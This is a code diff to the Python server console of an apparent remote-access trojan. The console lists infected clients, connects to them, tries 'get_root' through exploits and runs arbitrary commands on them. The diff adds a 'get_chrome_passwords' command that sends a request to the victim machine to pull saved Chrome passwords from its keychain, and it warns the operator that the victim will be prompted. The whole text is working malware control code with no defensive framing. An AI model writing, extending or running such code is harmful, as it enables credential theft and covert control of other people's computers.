@@ -19,7 +19,8 @@ MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
-commands = ["help", "status", "clients", "connect", "get_info", "get_root", "get_computer_name", "get_shell_info", "kill_client"]
+commands = ["help", "status", "clients", "connect", "get_info", "get_root", "get_computer_name",
+            "get_shell_info", "get_chrome_passwords", "kill_client"]
 status_messages = []
 
 # The ID of the client is it's place in the array
@@ -28,13 +29,14 @@ current_client_id = None
 
 
 def print_help():
-    print "help            -  Show this help menu."
-    print "status          -  Show debug information."
-    print "clients         -  Show a list of clients."
-    print "connect <ID>    -  Connect to the client."
-    print "get_info        -  Show basic information about the client."
-    print "get_root        -  Attempt to get root via exploits."
-    print "kill_client     -  Brutally kill the client (removes the server)."
+    print "help                 -  Show this help menu."
+    print "status               -  Show debug information."
+    print "clients              -  Show a list of clients."
+    print "connect <ID>         -  Connect to the client."
+    print "get_info             -  Show basic information about the client."
+    print "get_root             -  Attempt to get root via exploits."
+    print "get_chrome_passwords -  Attempt to retrieve Chrome passwords."
+    print "kill_client          -  Brutally kill the client (removes the server)."
     print "Any other command will be executed on the connected client."
 
 
@@ -167,6 +169,12 @@ if __name__ == '__main__':
                         elif command == "get_root":
                             print MESSAGE_INFO + "Attempting to get root, this may take a while..."
                             print send_command(connections[current_client_id], "get_root")
+                        elif command == "get_chrome_passwords":
+                            print MESSAGE_ATTENTION + "This will prompt the user to allow keychain access."
+                            confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n] ")
+
+                            if not confirm or confirm.lower() == "y":
+                                print send_command(connections[current_client_id], "get_chrome_passwords")
                         elif command == "kill_client":
                             print MESSAGE_INFO + "Removing server..."
                             response = send_command(connections[current_client_id], "kill_client")
